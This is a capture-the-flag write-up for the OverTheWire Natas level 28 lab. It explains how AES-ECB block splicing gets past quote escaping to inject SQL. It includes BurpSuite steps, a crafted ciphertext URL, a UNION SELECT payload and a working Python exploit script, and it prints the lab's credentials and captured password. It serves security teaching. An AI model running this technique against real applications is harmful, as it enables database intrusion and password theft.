# Natas Level 28 Writeup (natas28) – OverTheWire

## Overview

This level focuses on exploiting **AES-ECB encryption** to perform SQL injection.     
The goal is to find the password for the next level.

## Observation

When we open the page, we see a search field:

> **"Search:"**


When we enter:

```text
test
```

we are redirected to:

```text
search.php?query=<encrypted_value>
```

The `query` parameter contains a Base64-encoded encrypted value.

## Finding the Password

### Using Browser & BurpSuite

1. Enter `test` and `Intercept` the request in BurpSuite.

2. We get a request similar to:

```http
POST /index.php HTTP/1.1
Host: natas28.natas.labs.overthewire.org

query=test
```

3. The response redirects us to:

```http
HTTP/1.1 302 Found
Location: search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK...
```

4. Decode the URL encoding and Base64-decode the value. It is still encrypted.

5. Try different input lengths with helps of `Intruder`. We notice that the encrypted value changes in **16-byte blocks**. Repeated plaintext blocks also produce the same ciphertext blocks, which indicates **ECB mode**.
    ```text
    a
    aa
    aaa
    .........
    ```

6. The application escapes the single quote before encryption. Send:

    ```text
    '
    ```
    and then:
    ```text
    aaaaaaaaa' OR 1=1 #
    ```

7. With 9 `A`s, the quote is moved to the beginning of the next block after the escape character is added.

8. We can replace the block containing the unwanted escape character with a normal encrypted block.

9. For the replacement block, send:

    ```text
    aaaaaaaaaa     # [10 * a]
    ```

10. We can then construct the ciphertext using blocks from different requests:

    ```text
    [known block][replacement block][SQL injection block][known block]
    ```

11. For the SQL injection, use:

    ```sql
    ' UNION SELECT ALL password FROM users; -- 
    ```

12. Add 9 `a`s before the payload:

    ```text
    aaaaaaaaa' UNION SELECT ALL password FROM users; -- 
    ```

13. Replace the required block with the block obtained from the 10-a request.

14. Send the modified ciphertext to:

    ```text
    search.php/?query=G%2BglEae6W%2f1XjA7vRm21nNyEco%2fc%2BJ2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeWnPci%2fqKte0ohRTkObF%2BT5ujPcGtKfnu%2fmSL%2fsyLoz01sA1xi1%2BF7vPb%2fZHFEUMHp3PzGFCUqgFAjx%2BX0DfThXOKX%2ftKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC
    ```

15. The server decrypts the modified ciphertext and executes the SQL injection.

#### Proof

```text
<h2> Whack Computer Joke Database <h2>
<ul><li>hwgoYUiGWoSZAqphtCAZf7u1jS16KEah</li></ul>
```

### Using Python

```python
import requests, re
from urllib.parse import unquote, quote
from base64 import b64decode, b64encode

target = 'http://natas28.natas.labs.overthewire.org'

session = requests.Session()
session.auth = ('natas28', 'Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3')

block_size = 32   # 4(hex) * 32 = 128 bits


# # Identify characteristics of Cypher 

# b64_query = []
# hex_query = []
# length = 45
# for d in range(1, length):
#     query = 'a' * d
#     print(f"Fetching: {query}", end='\r')
#     r = session.post(target, params={'query':query})  

#     b64_query.append(unquote(r.url.split('=')[1])) 

#     hex_query.append(''.join(f'{c:02x}' for c in b64decode(unquote(r.url.split("=")[1]))))

# print(f"{'='*40} Base64 query {'='*40}")
# for i, j in enumerate(b64_query):
#     print(f'{i + 1:02d}-> {j}')
# print()

# print(f"{'='*40} Hex query {'='*40}")
# import textwrap
# for i, j in enumerate(hex_query):
#     print(f'{i + 1:02d}.')
#     print(textwrap.fill(j, width=32)) 
#     print()


# # find out followed character
# import string

# correct_string_hex = '9e622686a52640595706099abcb052bb'
# for c in string.printable:
#     print(f'trying: {c}', end='\r')
#     query = 'a' * 9 + c
#     r = session.post(target, params={'query':query})
#     answer = ''.join(f'{c:02x}' for c in b64decode(unquote(r.url.split("=")[1])))[block_size * 2 : block_size * 3]
#     if answer == correct_string_hex:
#         print(f'Character found: {c} : {answer}')
#         break


import math

injection = 'a' * 9 + "' UNION SELECT password FROM users; #"
block = math.ceil((len(injection) - 10) % block_size)  # injection block size

r = session.post(target, params={'query':injection})
raw_inject = ''.join(f'{c:02x}' for c in b64decode(unquote(r.url.split("=")[1])))

r = session.post(target, params={'query':'a'*10})
good_hex = ''.join(f'{c:02x}' for c in b64decode(unquote(r.url.split("=")[1])))

query_hex = good_hex[ : block_size * 3] + raw_inject[block_size * 3 : block_size * 3 + (block * block_size)] + good_hex[block_size * 3 : ]

# convert hex query into real query
injection_query = quote(b64encode(bytes.fromhex(query_hex))).replace('/', '%2f')
print(f'Injection query: {injection_query}')

r = session.get(f"{target}/search.php?query={injection_query}")

match = re.search(r'<li>(\w{32})', r.text)
print(f"\nPassword for next level is: {match.group(1)}")
```

## Vulnerability

The application uses **AES in ECB mode** to encrypt the SQL query.

Because each block is encrypted separately, encrypted blocks from different requests can be combined to create a different query.


## Flag

`hwgoYUiGWoSZAqphtCAZf7u1jS16KEah`
